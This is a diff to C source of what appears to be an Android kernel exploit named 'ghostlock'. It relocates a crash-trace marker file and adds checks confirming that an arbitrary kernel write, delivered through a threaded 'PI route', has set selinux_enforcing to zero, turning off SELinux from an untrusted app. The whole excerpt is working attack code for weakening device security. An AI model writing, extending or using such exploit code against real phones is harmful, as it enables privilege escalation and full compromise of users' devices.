@@ -200,7 +200,7 @@ int memfd_leak;
  * kernel panic can be pinpointed to the exact syscall (fsync'd, survives
  * panic-style reboot as long as the file system commits). */
 static void punch_mark(const char *tag, int seq) {
-  int fd = open("/data/local/tmp/punch_seq", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+  int fd = open("/sdcard/Download/ghostlock_punch_seq", O_WRONLY | O_CREAT | O_TRUNC, 0644);
   if (fd < 0) return;
   char buf[96];
   int n = snprintf(buf, sizeof(buf), "%s %d\n", tag, seq);
@@ -372,6 +372,35 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
   int routed = run_main_route_threads();
   TIMER("  PI route done");
   clear_pselect_write();
+  /* Diagnostic: check if the write landed on selinux_enforcing.
+   * If we wrote 0 to selinux_enforcing, /proc/self/attr/current becomes
+   * readable (was blocked under enforcing for untrusted_app).  Also try
+   * reading /sys/fs/selinux/enforce directly. */
+  if (routed) {
+    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+    if (efd >= 0) {
+      char ebuf[4] = {0};
+      ssize_t nr = read(efd, ebuf, sizeof(ebuf));
+      close(efd);
+      pr_info("  enforce-readable check: %zd bytes, val='%s'\n", nr, ebuf);
+      if (nr > 0 && ebuf[0] == '0') {
+        pr_success("  >>> WRITE VERIFIED: selinux_enforcing == 0 <<<\n");
+      }
+    } else {
+      pr_info("  enforce-readable check: open failed errno=%d (expected under enforcing)\n", errno);
+    }
+    /* Also try reading selinux attr — blocked under enforcing, readable under permissive */
+    int afd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
+    if (afd >= 0) {
+      char abuf[64] = {0};
+      ssize_t nr = read(afd, abuf, sizeof(abuf) - 1);
+      close(afd);
+      if (nr > 0) {
+        abuf[nr] = 0;
+        pr_success("  >>> WRITE VERIFIED: /proc/self/attr/current = '%s' <<<\n", abuf);
+      }
+    }
+  }
   if (!routed) {
     pr_warning("  PI route did not produce a verified write\n");
   }
